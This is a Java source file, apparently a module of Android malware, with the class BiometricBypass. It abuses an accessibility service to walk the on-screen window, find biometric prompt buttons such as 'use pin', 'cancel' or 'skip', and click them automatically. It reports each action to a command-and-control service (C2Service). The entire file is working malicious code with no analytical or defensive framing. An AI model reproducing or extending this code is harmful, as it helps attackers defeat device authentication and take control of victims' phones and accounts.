package com.wuzenx.engine;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import com.wuzenx.C2Service;
import com.wuzenx.services.WuzenAccessibilityService;

public class BiometricBypass {
    private Context context;
    private C2Service c2;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean active = false;

    public BiometricBypass(Context context, C2Service c2) {
        this.context = context;
        this.c2 = c2;
    }

    public void start() {
        active = true;
        c2.sendMessage("log", "Biometric bypass triggered");
        tryBypass();
    }

    public void stop() {
        active = false;
    }

    private void tryBypass() {
        if (!active) return;

        try {
            AccessibilityNodeInfo root = WuzenAccessibilityService.instance != null ?
                WuzenAccessibilityService.instance.getRootInActiveWindow() : null;
            if (root == null) {
                handler.postDelayed(this::tryBypass, 500);
                return;
            }

            // Look for "use PIN/pattern/password instead" buttons
            String[] bypassTexts = {
                "use pin", "use password", "use pattern",
                "cancel", "use backup", "other options",
                "switch to pin", "skip", "dismiss"
            };

            findAndBypass(root, bypassTexts);
            root.recycle();
        } catch (Exception ignored) {}

        // Retry after delay
        if (active) {
            handler.postDelayed(this::tryBypass, 2000);
        }
    }

    private boolean findAndBypass(AccessibilityNodeInfo node, String[] texts) {
        if (node == null) return false;

        CharSequence nodeText = node.getText();
        CharSequence contentDesc = node.getContentDescription();

        if (nodeText != null || contentDesc != null) {
            String t = (nodeText != null ?
                nodeText.toString().toLowerCase() : "");
            String d = (contentDesc != null ?
                contentDesc.toString().toLowerCase() : "");

            for (String target : texts) {
                if (t.contains(target) || d.contains(target)) {
                    if (node.isClickable()) {
                        node.performAction(
                            AccessibilityNodeInfo.ACTION_CLICK);
                        c2.sendMessage("log",
                            "Biometric bypass: clicked '" + target + "'");
                        return true;
                    }
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable()) {
                        parent.performAction(
                            AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        return true;
                    }
                    if (parent != null) parent.recycle();
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            try {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndBypass(child, texts)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            } catch (Exception ignored) {}
        }

        return false;
    }
}
